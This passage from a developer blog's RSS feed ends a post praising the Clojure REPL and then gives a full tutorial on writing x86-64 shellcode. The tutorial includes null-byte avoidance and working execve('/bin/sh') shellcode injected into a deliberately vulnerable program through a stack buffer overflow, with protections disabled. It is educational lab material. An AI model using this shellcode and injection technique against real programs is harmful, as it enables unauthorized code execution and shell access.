mind&lt;/a&gt;. The language is
designed with the assumption that the users will modify the code while
it&apos;s running. That has huge implications for how we can interact with
the system. Besides, you won&apos;t lose the state of your application. As
far as I know, we cannot accomplish this when building backends with
languages like Java, Python or Ruby. Neither building frontends with
Angular or React, for example.&lt;/p&gt;
&lt;p&gt;Let&apos;s say that we are building a frontend with Angular. The normal flow
is to write the code and then run it on development mode with hot code
reload. That way, when you change something in the code, the browser
will get updated with the new code. However, you will lose the state of
the application. Depending on which language and framework you use, you
may have access to tools that allow you to do some of what the Clojure
REPL does. For example, &lt;a href=&quot;https://github.com/PatrickJS/angular-hmr&quot;&gt;Angular Hot Module
Reload&lt;/a&gt;. But still, all those
tools are outside the language. They lack capabilities, can be slower,
buggy, difficult to configure or have compatibility problems in the
future.&lt;/p&gt;
&lt;p&gt;Clojure, on the other hand, is a lispy language. It was designed with
the REPL in mind. We can modify our code while it is running. It may be
hard to understand how powerful this is until you try it yourself.
Anyway, I will try to show it to you. I have developed a simple
ClojureScript frontend with two pages. You can check it out at
&lt;a href=&quot;https://github.com/danielorihuela/bookworm-hut/tree/e51f8d2a52aa76f5b975e187cd8bff023a3ab255&quot;&gt;e51f8d2&lt;/a&gt;
of my &lt;a href=&quot;https://github.com/danielorihuela/bookworm-hut&quot;&gt;bookworm-hut&lt;/a&gt;
repository. In the following image, we can see the home page, the code
and the REPL session.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/home-panel-clean-repl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;From the REPL session, I can dispatch an event that triggers the
redirection into the register page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/register-panel-dispatch-repl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That is something that we cannot do in other languages. In Java, you
would need to debug a Java program while running it. Set breakpoints in
those places where you want to perform some operation. Wait for the code
to reach the breakpoints. Then, execute whatever you want on the
console. The Clojure REPL instead allows us to execute code at any time.
That is pretty cool. We can also add new code while the program is
running. Clojure will reload the new code without restarting the
application or losing the state. In the following image, we can see that
I modified the navigation event to display an alert box. Notice how the
running application acknowledges that, reloads it, and lets me execute
it with the same application state.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/new-feature-in-runtime.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Again, we cannot do this in other languages and systems. That is the
power of the REPL Driven Development. It can be hard to understand just
with images, so let me show you a gif.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/clojure-repl.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;If you still have doubts about the REPL Driven Development and how it
works, please, look into &lt;a href=&quot;https://clojureverse.org/t/misconceptions-about-repl-driven-development/6988&quot;&gt;Misconceptions about REPL-driven
development&lt;/a&gt;,
some &lt;a href=&quot;https://www.youtube.com/watch?v=3HxVMGaiZbc&quot;&gt;demonstrations&lt;/a&gt; and
&lt;a href=&quot;https://www.youtube.com/watch?v=3HxVMGaiZbc&quot;&gt;REPL Driven Development, Clojure&apos;s Superpower - Sean
Corfield&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Summary. Lispy languages are designed and built with the REPL in mind.
They assume the user will write and execute new code on a running
application (REPL Driven Development). That gives us capabilities not
present in other languages, frameworks and systems. From my experience,
they make the development faster and more pleasant.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/cl-repl.CT6ikvZZ.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Write your own shellcode</title><link>https://danielorihuela.dev/blog/write-your-own-shellcode/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/write-your-own-shellcode/</guid><description>Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets.</description><pubDate>Sat, 19 Oct 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#whats-a-shellcode&quot;&gt;What&apos;s a shellcode?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#building-a-shellcode&quot;&gt;Building a shellcode&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#hello-world-assembly&quot;&gt;Hello world assembly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#no-segments&quot;&gt;No segments&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#no-null-bytes&quot;&gt;No null bytes&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#jump-to-the-end-and-back&quot;&gt;Jump to the end and back&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#use-smaller-registers&quot;&gt;Use smaller registers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#experiment-with-shellcode-injection&quot;&gt;Experiment with shellcode
injection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;What&apos;s a shellcode?&lt;/h1&gt;
&lt;p&gt;In the software realm, a shellcode is a set of instructions that
attackers inject into a program to execute arbitrary commands. Commonly,
they use it to spawn a shell. However, you can do whatever you wish to.
For example, print something to stdout, create files, and open a port,
to name a few.&lt;/p&gt;
&lt;p&gt;In this post, I will show you the basics of building a shellcode and how
to avoid the most common pitfalls when executing it in an exploit.&lt;/p&gt;
&lt;h1&gt;Building a shellcode&lt;/h1&gt;
&lt;p&gt;A shellcode is built in assembly. Why assembly? Because they are
injected into running programs that are already compiled, assembled, and
linked. Once in runtime, the CPU is just reading machine instructions.
Thus, we need to inject assembly instructions.&lt;/p&gt;
&lt;p&gt;Building an assembly program can seem hard but there are lots of
resources where you can learn about it.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/mschwartz/assembly-tutorial?tab=readme-ov-file&quot;&gt;https://github.com/mschwartz/assembly-tutorial?tab=readme-ov-file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://nasm.us/docs.php&quot;&gt;https://nasm.us/docs.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://learnxinyminutes.com/docs/mips/&quot;&gt;https://learnxinyminutes.com/docs/mips/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cs.lmu.edu/~ray/notes/nasmtutorial/&quot;&gt;https://cs.lmu.edu/~ray/notes/nasmtutorial/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://portal.cs.umbc.edu/help/nasm/sample_64.shtml&quot;&gt;https://portal.cs.umbc.edu/help/nasm/sample_64.shtml&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You must also know where to get the machine instructions for a given
architecture. You can get the information from the system. For example,
my 64-bit Linux machine has the file
&lt;code&gt;/usr/include/x86_64-linux-gnu/asm/unistd_64.h&lt;/code&gt; with the information.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#ifndef _ASM_UNISTD_64_H
#define _ASM_UNISTD_64_H

#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_close 3
#define __NR_stat 4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Alternatively, you can search for that information on the Internet, for
example,
&lt;a href=&quot;https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/&quot;&gt;https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/&lt;/a&gt; or
&lt;a href=&quot;https://j00ru.vexillium.org/syscalls/nt/64/&quot;&gt;https://j00ru.vexillium.org/syscalls/nt/64/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let&apos;s start writing a simple program to print to the stdout.&lt;/p&gt;
&lt;h2&gt;Hello world assembly&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;BITS 64 ; Define target architecture bits

section .data ; Data segment
msg db &quot;Hello, world!&quot;, 0x0a; String with new line char

section .text ; Text segment
global _start; Default entry point for ELF linking

_start:

; write
mov rax, 1 ; Specify write syscall
mov rbx, 1 ; Specify stdout by putting 1 into rbx
mov rsi, msg ; Put the address of the string into rsi
mov rdx, 14 ; Put the length of the string into rdx
syscall ; Execute the system call

; exit
mov rax, 60 ; Specify exit syscall
mov rbx, 0 ; Exit with success
syscall ; Execute the system call
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The program is simple. We define the target architecture bits, create a
static string, and print it into stdout. Assembling, linking, and
executing the binary is also very simple.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nasm -f elf64 helloworld.asm
ld helloworld.o
./a.out
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;See how it works and experiment a bit.&lt;/p&gt;
&lt;p&gt;Taking that program as a basis, we will now see the different
restrictions that we have to build a fully functional shellcode.&lt;/p&gt;
&lt;h2&gt;No segments&lt;/h2&gt;
&lt;p&gt;We inject shellcodes into running programs. Hence, we cannot specify the
data layout nor use other data segments like in the previous example.
The instructions must be self-contained. For instance, we cannot declare
a static string. We need to mix it with the other instructions.&lt;/p&gt;
&lt;p&gt;Removing the segments is easy, but… how can we mix the string? The stack
will be our ally. Remember that when calling a function, a stack frame
is created with the arguments, the local variables, and the return
address. We can misuse that in assembly to load a string. The idea is to
place the string directly after a call instruction. That way the return
address of the stack will match the address of the string and we will be
able to retrieve it inside the function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;BITS 64

call below
db &quot;Hello, world!&quot;, 0x0a

below:
; write
mov rax, 1
mov rdi, 1
; Pop the value from the return address 
; and store it into the register
pop rsi 
mov rdx, 14
syscall

; exit
mov rax, 60
mov rdi, 0
syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Try it out and experiment with it.&lt;/p&gt;
&lt;p&gt;In some situations that&apos;s the only technique you will need to inject a
shellcode. However, there are some occasions where this may fall short
and you will get a segmentation fault. Often, shellcodes are injected as
strings with functions like &lt;code&gt;strcpy&lt;/code&gt;. These types of functions terminate
at the first null byte. If we want it to work as expected, we must
remove the null bytes.&lt;/p&gt;
&lt;h2&gt;No null bytes&lt;/h2&gt;
&lt;p&gt;There are different techniques to remove null bytes. Let&apos;s see our
starting point.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nasm helloworld.asm
hexdump -C helloword
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/hexdump-t0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Notice how many &lt;code&gt;00&lt;/code&gt; are there. These are the null bytes.&lt;/p&gt;
&lt;h3&gt;Jump to the end and back&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;call&lt;/code&gt; instructions allow for &quot;long&quot; jumps. Using it for &quot;small&quot; jumps
as we are doing in our shellcode means that the operand doesn&apos;t fill the
entire space reserved for the operand value, and it gets padded with
null bytes.&lt;/p&gt;
&lt;p&gt;We can us the two&apos;s complement to avoid that. If we pass a negative
number to the &lt;code&gt;call&lt;/code&gt; instruction, the value will be padded with &lt;code&gt;0xff&lt;/code&gt;
instead of null bytes. A standard implementation of this solution
consists of jumping to the end of the assembly program to a &lt;code&gt;call&lt;/code&gt;
instruction that will jump back to a function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;BITS 64

jmp short bottom

above:
; write
mov rax, 1
mov rdi, 1
pop rsi
mov rdx, 14
syscall

; exit
mov rax, 60
mov rdi, 0
syscall

bottom:
call above
db &quot;Hello, world!&quot;, 0x0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/hexdump-t1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We removed some null bytes.&lt;/p&gt;
&lt;h3&gt;Use smaller registers&lt;/h3&gt;
&lt;p&gt;Computers have 16 registers. 64-bit registers are built on top of old
registers. For instance, EAX is part of RAX and it contains its first 32
bits.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;64-bit register&lt;/th&gt;
&lt;th&gt;Lower 32 bits&lt;/th&gt;
&lt;th&gt;Lower 16 bits&lt;/th&gt;
&lt;th&gt;Lower 8 bits&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;rax&lt;/td&gt;
&lt;td&gt;eax&lt;/td&gt;
&lt;td&gt;ax&lt;/td&gt;
&lt;td&gt;al&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rbx&lt;/td&gt;
&lt;td&gt;ebx&lt;/td&gt;
&lt;td&gt;bx&lt;/td&gt;
&lt;td&gt;bl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rcx&lt;/td&gt;
&lt;td&gt;ecx&lt;/td&gt;
&lt;td&gt;cx&lt;/td&gt;
&lt;td&gt;cl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rdx&lt;/td&gt;
&lt;td&gt;edx&lt;/td&gt;
&lt;td&gt;dx&lt;/td&gt;
&lt;td&gt;dl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rsi&lt;/td&gt;
&lt;td&gt;esi&lt;/td&gt;
&lt;td&gt;si&lt;/td&gt;
&lt;td&gt;sil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rdi&lt;/td&gt;
&lt;td&gt;edi&lt;/td&gt;
&lt;td&gt;di&lt;/td&gt;
&lt;td&gt;dil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rbp&lt;/td&gt;
&lt;td&gt;ebp&lt;/td&gt;
&lt;td&gt;bp&lt;/td&gt;
&lt;td&gt;bpl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rsp&lt;/td&gt;
&lt;td&gt;esp&lt;/td&gt;
&lt;td&gt;sp&lt;/td&gt;
&lt;td&gt;spl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r8&lt;/td&gt;
&lt;td&gt;r8d&lt;/td&gt;
&lt;td&gt;r8w&lt;/td&gt;
&lt;td&gt;r8b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r9&lt;/td&gt;
&lt;td&gt;r9d&lt;/td&gt;
&lt;td&gt;r9w&lt;/td&gt;
&lt;td&gt;r9b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r10&lt;/td&gt;
&lt;td&gt;r10d&lt;/td&gt;
&lt;td&gt;r10w&lt;/td&gt;
&lt;td&gt;r10b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r11&lt;/td&gt;
&lt;td&gt;r11d&lt;/td&gt;
&lt;td&gt;r11w&lt;/td&gt;
&lt;td&gt;r11b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r12&lt;/td&gt;
&lt;td&gt;r12d&lt;/td&gt;
&lt;td&gt;r12w&lt;/td&gt;
&lt;td&gt;r12b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r13&lt;/td&gt;
&lt;td&gt;r13d&lt;/td&gt;
&lt;td&gt;r13w&lt;/td&gt;
&lt;td&gt;r13b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r14&lt;/td&gt;
&lt;td&gt;r14d&lt;/td&gt;
&lt;td&gt;r14w&lt;/td&gt;
&lt;td&gt;r14b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r15&lt;/td&gt;
&lt;td&gt;r15d&lt;/td&gt;
&lt;td&gt;r15w&lt;/td&gt;
&lt;td&gt;r15b&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;When using bigger registers, values are padded with null bytes if they
can&apos;t fill the space. Therefore, we want to use the smallest register
possible in each operation. However, the remaining bytes can contain any
data. We need to zero them out. This can be easily achieved with the xor
operation. Additionally, calling &lt;code&gt;mov register, 0&lt;/code&gt; adds null bytes. We
need to use &lt;code&gt;dec register&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;BITS 64

jmp short bottom

above:
; write
xor rax, rax
inc al
xor rdi, rdi
inc rdi
pop rsi
xor rdx, rdx
mov dl, 14
syscall

; exit
mov al, 60
dec rdi
syscall

bottom:
call above
db &quot;Hello, world!&quot;, 0x0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/hexdump-t2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We removed all the null bytes!!! This is it. Shellcodes are just a
matter of executing system calls and avoiding null bytes. Let&apos;s try it
out with a hands-on exercise.&lt;/p&gt;
&lt;h1&gt;Experiment with shellcode injection&lt;/h1&gt;
&lt;p&gt;Relevant system information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux 5.15.0-122-generic x86_64&lt;/li&gt;
&lt;li&gt;Intel(R) Core(TM) i7-10510U CPU&lt;/li&gt;
&lt;li&gt;Little Endian&lt;/li&gt;
&lt;li&gt;48 bits address size&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All the vulnerable programs are from Hacking: The Art of Exploitation,
2nd Edition. Get the source code from
&lt;a href=&quot;https://github.com/intere/hacking/blob/master/booksrc&quot;&gt;https://github.com/intere/hacking/blob/master/booksrc&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We will use two programs from the book: &lt;code&gt;getenvaddr.c&lt;/code&gt; and
&lt;code&gt;notesearch.c&lt;/code&gt; (that requires &lt;code&gt;hacking.h&lt;/code&gt;). We will store the shellcode
in an environment variable and inject it into the vulnerable program
with a stack-based buffer overflow. If you want to learn more about
stack-based buffer overflows and how to take advantage of the
environment, you can check &lt;a href=&quot;../stack-based-buffer-overflows&quot;&gt;Stack-based buffer
overflows&lt;/a&gt; and &lt;a href=&quot;../store-shellcode-in-environment-variable&quot;&gt;Store shellcode in
environment variable&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let&apos;s compile the programs. Notice how we disable all the security
measures for the vulnerable program.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc getenvaddr.c -o getenvaddr
gcc notesearch.c -o notesearch -fno-stack-protector -z execstack -no-pie -g
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we have to:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Assemble the shellcode&lt;/li&gt;
&lt;li&gt;Export the shellcode into an environment variable&lt;/li&gt;
&lt;li&gt;Check the address of the environment variable from the vulnerable
program point of view&lt;/li&gt;
&lt;li&gt;Inject the code into the vulnerable program&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Which translates into the following.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nasm helloworld.asm
export SHELLCODE=$(cat helloworld)
~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch
~/Desktop/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\xab\xef\xff\xff\xff\x7f\x00\x00&quot;&apos;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/write-stdout-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Cool! We managed to take control of the program and print what we wanted
to the stdout. This is rather dull. Let&apos;s try to get a shell prompt!!!&lt;/p&gt;
&lt;p&gt;What would this look like in C?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;

int main(int argc, char *argv[]) {
    system(&quot;/bin/sh&quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You can try it out with &lt;code&gt;gcc shell.c -o shell; chmod +x shell; ./shell&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you search on the internet, you will find that
&lt;a href=&quot;https://man7.org/linux/man-pages/man3/system.3.html&quot;&gt;system&lt;/a&gt; internally
calls &lt;a href=&quot;https://man7.org/linux/man-pages/man3/execl.3.html&quot;&gt;execl&lt;/a&gt;, which
is build on top of the
&lt;a href=&quot;https://man7.org/linux/man-pages/man2/execve.2.html&quot;&gt;execve&lt;/a&gt; system
call. Execve receives three parameters: the program, the argument to the
program, and key-value pairs to be passed as the environment. In our
case, to spawn a shell, we are only interested in the first argument.
Overall, building an assembly program that spawns a shell seems easy.
Just call &lt;code&gt;execve&lt;/code&gt; with &lt;code&gt;/bin/sh&lt;/code&gt; as the program name.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;BITS 64

jmp short bottom

above:
; write
xor rax, rax
mov al, 59
xor rdi, rdi
pop rdi
xor rsi, rsi
xor rdx, rdx
syscall

; exit
mov al, 60
dec rdi
syscall

bottom:
call above
db &quot;/bin/sh&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s try to inject it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nasm shell.asm; \
export SHELLCODE=$(cat shell); \
~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch; \
~/Desktop/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\xb3\xef\xff\xff\xff\x7f\x00\x00&quot;&apos;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/shell-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We got shell access!!!&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item></channel></rss>